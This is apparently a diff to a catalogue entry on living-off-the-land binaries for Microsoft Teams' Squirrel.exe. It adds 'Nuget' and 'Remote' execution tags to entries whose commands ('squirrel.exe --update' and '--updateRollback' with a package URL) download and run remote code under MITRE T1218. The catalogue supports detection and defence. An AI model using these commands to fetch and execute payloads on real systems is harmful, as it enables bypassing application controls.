@@ -18,6 +18,9 @@ Commands:
     Privileges: User
     MitreID: T1218
     OperatingSystem: Windows 7 and up with Microsoft Teams installed
+    Tags:
+      - Execute: Nuget
+      - Execute: Remote
   - Command: squirrel.exe --update [url to package]
     Description: The above binary will go to url and look for RELEASES file, download and install the nuget package.
     Usecase: Download and execute binary
@@ -25,6 +28,9 @@ Commands:
     Privileges: User
     MitreID: T1218
     OperatingSystem: Windows 7 and up with Microsoft Teams installed
+    Tags:
+      - Execute: Nuget
+      - Execute: Remote
   - Command: squirrel.exe --updateRollback=[url to package]
     Description: The above binary will go to url and look for RELEASES file, download and install the nuget package.
     Usecase: Download and execute binary
@@ -32,6 +38,9 @@ Commands:
     Privileges: User
     MitreID: T1218
     OperatingSystem: Windows 7 and up with Microsoft Teams installed
+    Tags:
+      - Execute: Nuget
+      - Execute: Remote
   - Command: squirrel.exe --updateRollback=[url to package]
     Description: The above binary will go to url and look for RELEASES file, download and install the nuget package.
     Usecase: Download and execute binary
@@ -39,6 +48,9 @@ Commands:
     Privileges: User
     MitreID: T1218
     OperatingSystem: Windows 7 and up with Microsoft Teams installed
+    Tags:
+      - Execute: Nuget
+      - Execute: Remote
 Full_Path:
   - Path: 'C:\Users\<username>\AppData\Local\Microsoft\Teams\current\Squirrel.exe'
 Code_Sample:
